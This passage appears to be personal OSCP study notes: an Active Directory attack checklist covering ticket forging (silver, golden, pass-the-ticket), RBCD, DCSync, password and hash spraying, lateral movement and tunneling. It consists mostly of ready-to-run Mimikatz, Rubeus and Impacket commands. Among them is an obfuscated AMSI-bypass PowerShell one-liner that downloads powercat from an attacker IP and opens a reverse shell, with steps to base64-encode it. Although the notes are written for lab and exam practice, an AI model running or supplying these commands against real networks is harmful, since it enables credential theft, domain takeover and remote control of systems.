```cmd
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
```
💡 This scans LSASS and dumps all available TGTs and TGS tickets into `.kirbi` files in your working directory.
- [ ] **2.** Verify exported `.kirbi` tickets
```powershell
dir *.kirbi
```
- [ ] **3.** Inject the desired `.kirbi` ticket using Mimikatz
**With Invoke-Mimikatz.ps1:**
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt <TICKET_FILENAME>.kirbi"'
```
**With mimikatz.exe:**
```cmd
mimikatz.exe "kerberos::ptt <TICKET_FILENAME>.kirbi"
```
📌 This loads the TGS or TGT into your current session’s Kerberos cache.
- [ ] **4.** Confirm the ticket has been successfully injected
```powershell
klist
```
- [ ] **5.** Retry accessing the previously denied resource
```powershell
ls \\<TARGET_MACHINE>\<SHARE>
```

You should now be authenticated to the resource, depending on the ticket’s scope.

📝 Notes:
- Tickets must be **valid for the specific SPN/service** you're targeting.
- If expired or for a different service, access will still be denied.
- Works best post-exploitation, often paired with Unconstrained Delegation or credential dumping.

----

# ⚠️ 🎟️ 🥈 Silver Ticket Attack Checklist
- `Silver Ticket` : Best you can impersonate is **Local Admin**
- `Golden Ticket` : Best you can impersonate is **Domain Admin**

**Silver Tickets** – forged **TGS** (Ticket Granting Service) tickets for a specific service, allowing access without a TGT or full Kerberos exchange. You impersonate **any** user (or `service Administrator`)  for a **specific SPN** (like HTTP or CIFS) on a **single target machine**. (Offsec Nagoya)

## ✅ Prerequisites
- [ ] NTLM hash of the **service account** password (not the user you're impersonating)
- [ ] The **SPN** of the target service (e.g., `HTTP/web04.corp.com`)
- [ ] The **Domain SID**
- [ ] A valid **existing domain username** to impersonate

## 🛠️ Steps
- [ ] **1. Enumerate SPNs and get service account hash** From domain:
```powershell
setspn -T <bossingit.biz> -Q */*
```
 Or using PowerView:
```
Get-NetUser -SPN
```
- [ ] Extract the service account hash:
```text
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```
Or with mimikatz.exe:
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```
Or remotely with Impacket:
```
impacket-secretsdump <bossingit.biz>/<USER>@<HOST>
```
- [ ] **2. Get the domain SID**
```
whoami /user
```
- [ ] **3. Forge and inject Silver Ticket**

**With Invoke-Mimikatz.ps1:**
```
Invoke-Mimikatz -Command '"kerberos::golden /user:<USERNAME> /domain:<bossingit.biz> /sid:<bossingit.biz_SID> /target:<TARGET_FQDN> /service:<SERVICE_NAME> /rc4:<NTLM_HASH> /ptt"'
```
**With mimikatz.exe:**
```
mimikatz.exe "kerberos::golden /user:<USERNAME> /domain:<bossingit.biz> /sid:<bossingit.biz_SID> /target:<TARGET_FQDN> /service:<SERVICE_NAME> /rc4:<NTLM_HASH> /ptt"
```
**With Impacket:**
****
Get the domain Sid via this Powershell command or another way
```
Get-AdDomain
```

If you know the Password of the SPN you can generate the NT hash with this python command
```
python3 -c "import hashlib; print(hashlib.new('md4', 'PASSWORD'.encode('utf-16le')).hexdigest())"
```

```
impacket-ticketer -nthash <NTLM_HASH> -domain <bossingit.biz> -domain-sid <bossingit.biz_SID> -spn <SERVICE>/<FQDN> <USERNAME_TO_IMPERSONATE> 
```

eg: ( inc (`-user-id 500`)  if forgeing the administrater (typical)
```
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 administrator
```

4. Load the ccache file into the local env
```
export KRB5CCNAME=$(pwd)/administrator.ccache
```

- [ ] **5. Use the forged ticket**
- `PS:>` Confirm it loaded:
```
klist
```
- `PS:>` Try access useing Kerberos : eg

```
impacket-mssqlclient -k nagoya.nagoya-industries.com
```
**If tuneling the mssql service and kerberos**, We need to tell Impacket to open the TCP connection through our 127::1 tunnel with -target-ip 127::1, and use the server FQDN in `-k` so the SPN matches.
```
impacket-mssqlclient -k nagoya.nagoya-industries.com -target-ip 127.0.0.1
```

```
Invoke-WebRequest -UseDefaultCredentials http://<TARGET>
PsExec.exe \\<TARGET> -s cmd.exe
```

```bash
# On Linux:
psexec.py -k -no-pass -target-ip <IP> <bossingit.biz>/<USER>@<TARGET_FQDN>
```

📝 **Notes**:
- This only works for the service the TGS is forged for—unlike Golden Tickets, Silver Tickets are scoped.
- SPNs like `cifs/host`, `http/web`, etc. must match the service the account runs under.



---

#  ⚠️  Unconstrained Delegation
- [ ]  **Unconstrained Delegation** - A machine is permitted unconstrained delgation so it can impoersonate ( and create tickets for) any user who logs on to it. 1. https://adsecurity.org/?p=1667 and 2. https://blog.harmj0y.net/redteaming/another-word-on-delegation/ .

- [ ] `PV:>` if any, attackers controlling those hosts can impersonate users, the creds can be dumped, hopefully of the DA.
```
Get-NetComputer -Unconstrained 
```
- [ ] `PV:>` Check if current user has unusual rights: use BloodHound or PV to find excessive
permissions (e.g. GenericAll on high-value objects) 
```
Get-ObjectAcl
```
##### Dump the tickets 
- [ ] Nativley
```
klist
```
- [ ] Rubeus
```
.\Rubeus.exe dump
```
- [ ] Mimi
```
mimikatz.exe sekurlsa::tickets /export
```

- [ ] **Password Spraying / Guessing** – try common passwords against many accounts 
  - Use **CrackMapExec** or **Kerbrute** (slow enough to respect domain lock-out policy). 
  - **Note:** every valid login for later pivots.

---


# ⚠️  RBCD (Resource Based Constrained Delegation)
**RBCD** – an attacker who controls `MachineOne` (*even a nasty domain-joined machine account*) **and** has write access to the delegation settings of `MachineTwo` can configure `MachineTwo` to trust `MachineOne` to act on behalf of any domain user includeing the Admin, allowing the attacker to impersonate users like a Domain Admin when accessing `Machine2`. - 

- [ ] **0.** Confirm you *do not already* have access to the target
```cmd
dir \<TARGET_MACHINE_FQDN>\C$
```

- `Import-Module ./PowerView.ps1`
  

- [ ] **1.** Check if your current user has `GenericAll` over the target machine's AD object . *Sometimes `WriteDACL` also works depending on tool & setup.*
```powershell
Get-ObjectAcl -SamAccountName <TARGET_MACHINE_NAME>$ | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" }
```

- [ ] **2.** Create a new computer object in AD (you have `GenericAll` on the domain)
```bash
impacket-addcomputer <bossingit.biz>/<USERNAME> -dc-ip <DC_IP> -hashes :<NTLM_HASH> -computer-name '<NEW_COMPUTER_NAME>' -computer-pass 'Tuesday@2'
```

- [ ] **3.** Set the `msds-allowedtoactonbehalfofotheridentity` property on the target computer
```bash
impacket-rbcd -dc-ip <DC_IP> -action write -delegate-to <TARGET_MACHINE_NAME> -delegate-from <NEW_COMPUTER_NAME> -hashes :<NTLM_HASH_OF_CONTROLLED_MACHINE_ACCOUNT> <bossingit.biz>/<USERNAME>
```

- [ ] **4.** Obtain a service ticket to the target using your fake machine
```bash
impacket-getST -spn cifs/<TARGET_MACHINE_FQDN> <bossingit.biz>/<NEW_COMPUTER_NAME>\$:'<NEW_COMPUTER_PASSWORD>' -impersonate <TARGET_USER> -dc-ip <DC_IP>
```

- [ ] **7.** Add the ticket to your local env
```
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

- [ ] **8.** Open a shell
```
sudo impacket-psexec -k -no-pass <TARGET_MACHINE_FQDN> -dc-ip <DC_IP>
```

### Alternative RBCD with Rubeus
- [ ] (Alternative method) Forge and inject ticket using Rubeus. (Get target user SID (if needed))
```powershell
.\Rubeus.exe userinfo /user:<TARGET_USER>
```

```
.\Rubeus.exe s4u /user:<NEW_COMPUTER_NAME>$ /rc4:<RC4_HASH> /impersonateuser:<TARGET_USER> /msdsspn:cifs/<TARGET_MACHINE_FQDN> /domain:<bossingit.biz> /dc:<DC_HOSTNAME> /ptt
```

- [ ] **6.** Access the target machine as the impersonated user
```cmd
dir \\<TARGET_MACHINE_FQDN>\C$
```
*Or use tools like PsExec, RDP, Evil-WinRM—depending on what the service accepts.*

ALSO see See my [Notes on OFFSEC Resourced Box on RBCD](https://github.com/BaronSam3di/OSCP-COURSE-Notes/blob/main/OSCP-Obsidian-Vault/12WP-new/SUMMER-2025/PREVIOUS-Boxes/Resourced-W/Resourced-192.168.179.175-W.md#walkthough---of-rbcd) which includes useing the binary `StandInN45.exe`


Note: IF erros , may need ot resolve clock skew with `sudo ntpdate 192.168.102.227`


#####  These are the steps from the useing `StandInN45.exe Offsec Resouced

Make sure Add all the IPS to the `/etc/hosts` 

1. **Get ready to note the passord generated `GENRTD_PASSW`**
```
./StandInN45.exe --computer nasty --make
```

2. create the NTLM hash (RC4 hmac) and of the nasty computer
```
.\Rubeus.exe hash /user:nasty /domain:resourced.local /password:<GENRTD_PASSW>
```

Get The NTLM/RC4 Hash like ...
```
5EC2394BC63129E04A36CD65290BE3DE
```

Get the `nasty$` Computer SID (`PV:> Get-NetComputer`)
```
S-1-5-21-1677581083-3380853377-188903654-6101
```

3. Add the SID of nasty to the Domain Controller `ResourceDC`
```
./StandInN45.exe --computer ResourceDC --sid S-1-5-21-1677581083-3380853377-188903654-6101
```

4. We can now create tickets as the Domain Controller ( note the `$` in the name)
```
.\Rubeus.exe s4u /user:nasty$ /rc4:5EC2394BC63129E04A36CD65290BE3DE /impersonateuser:Administrator /msdsspn:cifs/ResourceDC.resourced.local /domain:resourced.local /dc:10.129.121.211 /nowrap /ptt
```

5. Get the Admin ticket blob at the bottom of the output
- `echo <BASE64_BLOB> > ticket.b64`
 
7. Decode the Base64 Blob to the correct format
```
cat ticket.b64 | base64 -d > ticket.kirbi
```

1. Create a ccashe ticket 
```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

1.  Add the ticket to the locla env. ( Check by running `klist`)
```
export KRB5CCNAME=$(pwd)/Administrator.ccache
```
1.  Start a session on the DC as the Administrator
```
impacket-psexec resourced.local/administrator@resourcedc.resourced.local -k -no-pass -dc-ip 192.168.102.227
```



---

# ⚠️  DCSync Attack  (Replicate AD secrets without touching NTDS file)

*Requires account with **Replicating Directory Changes** rights (Domain/Enterprise Admins or delegated).*  

### ✅ Prerequisites Check
- [ ] Confirm AD domain presence: `systeminfo`, `set`, or `nltest /dclist:<domain>`
- [ ] Identify DCs: `nltest /dclist:<domain>` or `netdom query dc`
- [ ] Target/Current user has **one of**:
- Member of Domain Admins / Enterprise Admins / Administrators (`whoami /groups`), and ACE of `DS-Replication-Get-Changes-All`

- `PV:>` Replication permissions: 
```
Get-ObjectAcl -SamAccountName <username> | ? { $_.ActiveDirectoryRights -match "Replicating" }
```

- [ ] `PV:>` Get the users SID
```
Get-DomainUser -Identity <TARGET>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
- [ ] `PS:>` Set SID as env var
```
$sid= "<TARGET_USERS_SID>"
```
- [ ] `PV:>` - View any/all Replication **ACEs**
```
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
**If the above shows that the user has `DS-Replication-Get-Changes-All` we should try secrets dump commands etc below**
### Windows (Mimikatz)
- [ ] Dump KRBTGT hash:
```powershell
mimikatz.exe "lsadump::dcsync /domain:corp.com /user:krbtgt"
```
- [ ] Dump any domain user:
```powershell
mimikatz.exe "lsadump::dcsync /domain:corp.com /user:<target>"
```
### Linux (Impacket)
- [ ] Use `secretsdump.py` to pull all available user hashes via DRSUAPI:
```bash
impacket-secretsdump -just-dc-user <target> corp.com/<user>:<password>@<DC-IP>
```
- [ ] Example (with KRBTGT):
```bash
impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:'P@ssw0rd!'@192.168.179.1
```

**ippsecs fav secrets dump which gives the history**
```
impacket-secretsdump -user-status -history -pwd-last-set administrator.htb/ethan@10.129.238.166  # ippsecs fav secrets dump which gives the history
```

```
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.139.5
```

- [ ] From the HTB module - Will dump three files 
```
impacket-secretsdump -outputfile SecretsDump_hashes -just-dc INLANEFREIGHT/adunn@172.16.139.5 -just-dc-user syncron
```

---

# ⚠️🎫🥇 Golden Tickets (Forged **TGT** → domain-wide access)
- `Silver Ticket` : Best you can get is to Impersonate **Local Admin**
- `Golden Ticket` : Best you can get is to Impersonate **Domain Admin**

> *Need the **KRBTGT** NTLM hash + domain SID; lets you mint a “master” ticket valid on every DC.*

- [ ] **Confirm prerequisites**
    - Are you **Domain Admin / SYSTEM on a DC**?  
      `whoami /groups` should list *Domain Admins* or *Administrators*.  
    - Dump the **KRBTGT hash**  
- [ ] Dumps all local secrets 
```
mimikatz.exe lsadump::lsa /patch
```
- [ ] or offline from Kali
```
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```
- Grab the **Domain SID**  
`whoami /user`  → copy value before last “-RID” (e.g., *S-1-5-21-…*) :contentReference[oaicite:12]{index=12}

#### Windows (Mimikatz)
- [ ] Clear ticket cache:
```powershell
mimikatz.exe "kerberos::purge"
```
- [ ] Inject golden ticket:
```
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.com /sid:<bossingit.biz_SID> /krbtgt:<HASH> /id:500 /ptt"
```
- [ ] Validate `PS:>:
```
klist
```
#### Linux (Impacket Ticketer)
- [ ] Generate ticket:
```
impacket-ticketer -nthash <HASH> -domain corp.com -sid <bossingit.biz_SID> <USER>
```
- [ ] Export and use ticket:
```
export KRB5CCNAME=./corp.ccache
```

- [ ] **Leverage**
- SMB / PsExec: `psexec \\DC1 cmd`  → should now succeed as DA.  
- Persist: save the `.kirbi` file (`kerberos::golden … /ticket:<file>`).

---
# ⚠️ Password/HASH Spraying 

#### 🪪 Prerequisites
- [ ] Valid domain user list (from enumeration tools or manual AD dump)
- [ ] Small, smart password list (e.g., `Winter2024!`, `Summer2023!`, etc.)
- [ ] Domain lockout policy known or assumed (to avoid account lockouts)
```
Get-ADDefaultDomainPasswordPolicy
```

- [ ] ⚠️  **Spray plaintext passwords** (1 password, many users)
🛑 Avoid testing multiple passwords per user in one run.
- [ ] # SMB (fast, cautious)
```bash
nxc smb <TARGET_IP or RANGE> -u users.txt -p 'Winter2024!' --continue-on-success
```
- [ ] # Kerberos-based spray (safer for detection)
```
kerbrute passwordspray -d <bossingit.biz> --dc <DC-IP> users.txt 'Winter2024!'
```
- [ ] ⚠️  **Spray NTLM hashes** (from LSASS or DCSync)
🛑 Avoid testing multiple passwords per user in one run.
- [ ] Hashes many users/machines
```bash
nxc smb <IP> -u usernames.txt -H hashes.txt
```
- [ ] # Manual check
```
nxc smb <IP> -u <user> -H <NTLM_HASH>
```

- [ ] ⚠️ **Confirm valid logins**
- [ ] Evil-WinRM
```bash
evil-winrm -i <IP> -u <user> -p '<Password>'
```
- [ ] PsExec
```
psexec.py <bossingit.biz>/<user>:<Password>@<IP>
```

### Spraying from Linux
- [ ] WIth Bash and `rpcclient`
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 192.168.102.227 | grep Authority; done
```
- [ ] With Kerbrute
```
kerbrute passwordspray -d <bossingit.biz> --dc DC_192.168.102.227 valid_users.txt  Welcome1 
```
- [ ] Netexec
```
smb 192.168.102.227 -u valid_users.txt -p Tuesday@2 | grep +
```
- [ ] NXC , single try accross the domain to prevent lockouts (`--local-auth`)
```
sudo nxc smb --local-auth SUBNET/23 -u administrator -H <HASH_VALUE> | grep +
```

### Spraying from Windows
- [This tool](https://github.com/dafthack/DomainPasswordSpray) is in the immidiate tools
```
Import-Module .\DomainPasswordSpray.ps1
```

```
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---
### Privilege Escalation (Domain Escalation)
*Goal: turn foothold creds → high-priv tokens (ideally Domain Admin).*

- [ ] **Use Discovered Creds for PrivEsc**  
      • If a cracked / stolen account is Domain Admin (DA) or similar, just log in:  
        `runas /user:<bossingit.biz>\<user> cmd.exe` *or* RDP/SMB with those creds.  
      • Have an NTLM hash? Pass-the-Hash with Impacket:  
        `psexec.py -hashes <LM>:<NT> <bossingit.biz>/<user>@<host>`  
      • Have a `.kirbi` ticket? Pass-the-Ticket via Mimikatz:  
        `mimikatz kerberos::ptt <ticket.kirbi>`

- [ ] **Abuse AD Delegation Misconfigs**  
      • *Unconstrained*: pivot to the delegated host, wait for a DA logon, dump their TGT.  
      • *Constrained / RBCD*: forge or relay a ticket with **Rubeus** S4U:  
        `Rubeus.exe s4u /impersonateuser:<target> /msdsspn:<svc>/<host>`  

- [ ] **Abuse AD ACLs / Roles**  
      • If you hold **GenericAll / GenericWrite** on a user/group ⇒ reset its password:  
        `net user <admin> <NewP@ssw0rd> /domain`  
      • If you can edit group membership ⇒ add your user to **Domain Admins**.  
      • Confirm new privilege with `whoami /groups`.

- [ ] **Leverage Local Admin on a DC**  
      • With local Administrator on a Domain Controller:  
        – Dump full database: `secretsdump.py -system SYSTEM -ntds NTDS.DIT LOCAL`  
        – Or live sync: `mimikatz lsadump::dcsync /domain:<bossingit.biz> /all`

- [ ] **Misc Elevation Paths**  
      • **Backup Operators**, **DNSAdmins**, **Print Operators** etc. often lead to SYSTEM/DA.  
      • Example (DNSAdmins): upload malicious DLL → restart DNS service.  

- [ ] **(Optional) Persistence**  
      • Create stealth DA user, add SID-History, or schedule SYSTEM task.  
      • *Skip on OSCP exam unless explicitly allowed.*

---

### Lateral Movement (Pivoting & Expanding Access)
*Goal: ride stolen creds to new hosts, dump more creds, snowball → objective.*

- [ ] **Identify Reachable Targets**  
      • Subnet sweep (`ping`, `nmap -sn`), resolve AD computer list:  
        `Get-NetComputer -fulldata | select Name,OperatingSystem`  
      • Check where you’re already admin:  
        `Find-LocalAdminAccess` (PowerView).

- [ ] **Reuse Credentials / Hashes**  
      • SMB exec: `crackmapexec smb <IPrange> -u <user> -H <NTLM>`  
      • PsExec: `psexec.py <bossingit.biz>/<user>:<pass>@<host>`  
      • WinRM: `evil-winrm -i <host> -u <user> -p <pass>`  
      • WMI: `wmic /node:<host> process call create "cmd /c <payload>"`

- [ ] **Establish Foothold on New Host**  
      • Spawn reverse shell, drop agent, or schedule task as SYSTEM.  
      • Verify privileges with `whoami /priv` and escalate locally if needed.

- [ ] **Repeat Enum & Cred-Dump Cycle**  
      • On each new box: enumerate sessions, search files, run Mimikatz again.  
      • Harvest fresh tickets/hashes (esp. if DA logs in) and loop.

- [ ] **Target / Own Domain Controller**  
      • Use DA creds (or local-admin path) to get SYSTEM shell on DC.  
      • Exfil flags: `type C:\Users\Administrator\Desktop\proof.txt`.

- [ ] **Cleanup (time-permitting in labs)**  
      • Remove dropped binaries, backdoor accounts, suspicious tasks.  
      • Clearing logs not required for OSCP, but good practice elsewhere.



-----





### Service Attack Checks

- [ ] `PS>` Get the hashes in Hashcat format
```
Invoke-Kerberoast -OutputFormat Hashcat | select-Object Hash | Out-File -filepath 'c:\users\public\Hashes.txt' -Width 8000
```

- [ ] `K:>` Hashcat Kerbeoasting
```
hashcat -m 13100 -o CrackedHash.txt -a 0 Hashes.txt /usr/share/wordlists/rockyou.txt
```
- [ ] `K:>` Hashcat Alt Kerbeoasting
```
hashcat -m 13100 -o CrackedHash.txt -a 0 HashCapture.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show 
```
- [ ] `K:>` John - Kerbeoasting
```
john hashes-new.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt   
```
- [ ] `PS:>` Powercat reverse shell with AMSI bypass
```
[Ref].Assembly.GetType("System.Management.Automation."+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),"NonPublic,Static").SetValue($null,$true); IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.202/powercat.ps1");powercat -c 192.168.45.202 -p 443 -e cmd.exe
```

##### Encode above Reverse shell 
- [ ] Make the comnd a string
```
$text = '[Ref].Assembly.GetType("System.Management.Automation."+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),"NonPublic,Static").SetValue($null,$true); IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.202/powercat.ps1");powercat -c 192.168.45.202 -p 443 -e cmd.exe'
```
Encode it into the bytes
```
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```
Convert to Base64
```
$EncodedText = [Convert]::ToBase64String($Bytes)
```
Get/Take the B64 Blob
```
$EncodedText    
```
Run the blob with powerrshell
```
powershell.exe -enc <ENCODED_BASE_64_SCSHELL_BLOB>
```


## Lateral Movment deeper in to the network

```
$user = "inlanefreight\svc_sql"
```
```
$Password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
```
```
$credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
```
```
Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $credentials
```




#### AD Tunneling
- [ ] `PS:>`  - From a compromised Windows, start **Remote** port forwarding via our kali machine with -N to not give back a terminal on Windows (Just for SOCKS proxying) Alng with `proxychains`
```
ssh -R 1080 kali@192.168.45.202 -N
```

- [ ] From a intermidate machine, Local forward back to Kali
```
ssh -L <DC_IP>:4444:192.168.102.227:443 kali@192.168.45.202 -f -N 
```
- [ ] `K:>` Spray Creds through the tunnel
```
proxychains nxc smb <VIC.TI.M>.0/24 -u <USERNAME> -p <PASSWORD> 2>/dev/null
```
- [ ] `PS:>` Open ports on the Inbound firewall
```
netsh advfirewall firewall add rule name=TunnelIn dir=in action=allow protocol=TCP localport='80,443,4444'
``` 
- [ ] `PS:>` Open ports on the Outbound firewall
```
netsh advfirewall firewall add rule name=TunnelOut dir=out action=allow protocol=TCP localport='80,443,4444'
``` 
- [ ] `K:>` Tunneled Reverse shell . Fileless reverse shell ( schell requires rpc opene on port 135) 
```
proxychains python3 scshell.py <USERNAME>@192.168.102.227
```

#### MimiKatz via Powershell 
- [ ] `PS:>` Run Invoke-Mimikatz and dump to a filexs
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' > MimiDump.txt
```
- [ ] `K:>` Dump the hashes in the LSass Process (no need for mimikatz)
```
nxc smb <IP-ADDR> -u <USERNAME> -p <PASSWORD> --lsa  
```

#### Overpass the hash - 
- [ ] `PS:>` With Invoke-Mimikatz , if we can get it on the machine as the Admin. Request a Kerb Ticket from the DC and launch a new powershell but any coms by the process will be run as the compromised user Hannah.
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::pth /user:hannah /domain:offsec.live /ntlm:a29f7623fd11550def0192de9246f46b /run:powershell.exe" "exit"'  
```
- [ ] Over pass the Hash with rubeus
```
Rubeus.exe asktgt /domain:offsec.live /user:hannah /rc4:a29f7623fd11550def0192de9246f46b /ptt
```

Read the C drive on the DC after sucsessfull PtH session start
```
dir \\dc01\c$
```
- [ ] P
```
Invoke-Command -ComputerName DC01 -ScriptBlock {ipconfig}
```

---


#### Enum with linwinpwn
```
linwinrun -t <TARGET_DC_IP> --auto --verbose -T All -o ~/linwinpwn-output-null 2>&1 | tee ~/linwinpwn-output-null.txt
```
```
linwinrun -t <TARGET_DC_IP> -d <bossingit.biz> -u <USER> -p '<PASS>' --auto --verbose -T All -o ~/linwinpwn-output-auth 2>&1 | tee ~/linwinpwn-output-auth.txt
```


----

### WindapSearch

`--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options.
```
python3 windapsearch.py --dc-ip <DC_IPO_ADD> -u <USER>@<bossingit.biz> -p <PASSWD> --da
```

```
python3 windapsearch.py --dc-ip <DC_IPO_ADD> -u <USER>@<bossingit.biz> -p <PASSWD> -PU
```

#### Snaffler ( Shares and more)
[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. 
```
Snaffler.exe -s -d <bossingit.biz> -o snaffler-Report.log -v data
```
`-s` tells it to print results to the console for us
`-d` specifies the domain to search within
`-o` tells Snaffler to write results to a logfile. 
`-v` option is the verbosity level. 


## bloodhound 
- [ ]Run Bloohound collection locally , Produces a set of json files for bloodhound
```
bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.102.227 -d nagoya-industries.com -c all
```


### Sharphound Collection

```
.\SharpHound.exe -c All --zipfilename bossingit.biz-OP-DATA
```

**Sharphound collection**
```
SharpHound.exe --CollectionMethods All
```
```
SharpHound.exe -c all,gpolocalgroup
```